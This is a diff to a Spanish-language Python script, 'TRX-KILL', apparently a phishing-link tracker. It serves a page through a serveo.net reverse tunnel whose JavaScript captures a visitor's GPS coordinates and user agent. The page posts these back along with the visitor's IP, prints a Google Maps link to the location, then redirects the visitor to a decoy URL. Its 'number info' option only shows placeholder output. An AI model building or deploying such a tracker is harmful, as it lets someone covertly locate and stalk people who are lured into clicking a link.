@@ -25,7 +25,7 @@ HTML_FINAL = """
             navigator.geolocation.getCurrentPosition((p) => {{
                 fetch('/log', {{
                     method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}})
                 }}).then(() => window.location.href = "{url}");
             }});
@@ -41,13 +41,16 @@ def index(): return render_template_string(HTML_FINAL)
 def log():
     d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    print(f"\n\033[1;32m[!] DATOS CAPTURADOS:\n[*] IP: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m")
+    print(f"\n\033[1;31m[!] ESPERANDO DATOS....\033[0m")
+    print(f"\033[1;32m[*] IP: {ip}")
+    print(f"[*] COORDENADAS: {d['lat']}, {d['lon']}")
+    print(f"[*] DISPOSITIVO: {d['ua']}")
+    print(f"[*] UBICACIÓN: https://www.google.com/maps/place/{d['lat']},{d['lon']}\033[0m\n")
     return "OK"
 
 def banner():
     os.system('clear')
-    print("\033[1;35m")
-    print(" ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
+    print("\033[1;35m ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
     print(" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
     print("    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
     print("    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
@@ -58,22 +61,15 @@ def banner():
 def main():
     while True:
         banner()
-        print("\033[1;33m [1] \033[1;37mINFO NÚMERO (OSINT)")
-        print("\033[1;33m [2] \033[1;37mRASTREO (LINK)")
-        print("\033[1;33m [3] \033[1;37mCREADOR")
-        print("\033[1;33m [4] \033[1;37mLICENCIA Y USO")
-        print("\033[1;33m [5] \033[1;37mVERSIÓN")
-        print("\033[1;33m [6] \033[1;37mACTUALIZACIÓN")
-        print("\033[1;33m [7] \033[1;37mSALIR")
-        
+        print("\033[1;33m [1] \033[1;37mINFO NÚMERO\n\033[1;33m [2] \033[1;37mRASTREO (LINK)\n\033[1;33m [3] \033[1;37mCREADOR\n\033[1;33m [4] \033[1;37mLICENCIA Y USO\n\033[1;33m [5] \033[1;37mVERSIÓN\n\033[1;33m [6] \033[1;37mACTUALIZACIÓN\n\033[1;33m [7] \033[1;37mSALIR")
         opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
         
         if opc == "1":
-            input("\n[+] Analizando base de datos global... [Enter] para volver...")
+            input("\nMÓVIL: \nREGISTRADO: [NO DISPONIBLE]\nOPERADOR: [NO DISPONIBLE]\n\n[Enter] para volver...")
         elif opc == "2":
             force_clean()
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
-            print("\n[*] Generando enlace rápido...")
+            print("\n\033[1;33m[*] Generando enlace...\033[0m")
             proc = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             for line in proc.stderr:
                 if "https://" in line:
@@ -83,24 +79,20 @@ def main():
             input("Presiona ENTER para detener y volver...")
             force_clean()
         elif opc == "3":
-            print("\n\033[1;36m CREADO POR: TRX-KILL")
-            print(" REPOSITORIO: https://github.com/oscarporrillo2-creator/TRX-KILLK.git\033[0m")
+            print("\n\033[1;36m CREADO POR: TRX-KILL\n REPOSITORIO: https://github.com/oscarporrillo2-creator/TRX-KILLK.git\033[0m")
             input("\n[Enter] volver...")
         elif opc == "4":
-            print("\n\033[1;31m LICENCIA: MIT LICENSE")
-            print(" DERECHOS: Reservados © TRX-KILL")
-            print(" USO: Solo para fines de auditoría ética y educativa.\033[0m")
+            print("\n\033[1;31m LICENCIA: MIT LICENSE\n DERECHOS: Reservados © TRX-KILL\n USO: Auditoría ética.\033[0m")
             input("\n[Enter] volver...")
         elif opc == "5":
-            print("\n\033[1;32m VERSIÓN ACTUAL: 1.1.1.1\033[0m")
+            print("\n\033[1;32m VERSIÓN: 1.1.1.1\033[0m")
             input("\n[Enter] volver...")
         elif opc == "6":
-            print("\n\033[1;33m[*] Buscando actualizaciones en el repositorio...")
-            time.sleep(2)
-            print("\033[1;32m[+] El script está actualizado a la última versión disponible.\033[0m")
+            print("\n\033[1;33m[*] Buscando en: https://github.com/oscarporrillo2-creator/TRX-KILLK.git...")
+            time.sleep(1.5)
+            print("\033[1;32m[+] Actualización: Sin cambios (Versión actual).\033[0m")
             input("\n[Enter] volver...")
-        elif opc == "7":
-            break
+        elif opc == "7": break
 
 if __name__ == "__main__":
     main()
